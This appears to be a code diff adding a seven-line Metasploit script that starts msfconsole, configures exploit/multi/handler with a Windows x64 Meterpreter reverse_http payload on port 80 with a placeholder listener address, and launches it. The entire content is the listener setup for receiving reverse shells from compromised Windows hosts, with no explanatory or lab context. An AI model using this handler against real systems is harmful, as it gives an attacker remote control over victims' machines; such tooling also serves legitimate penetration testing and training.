@@ -1,0 +1,7 @@
+msfconsole 
+use exploit/multi/handler 
+set PAYLOAD windows/x64/meterpreter/reverse_http  
+set LHOST ’xxxx’ 
+set LPORT 80 
+set ReverseListenerBindAddress localhost 
+exploit
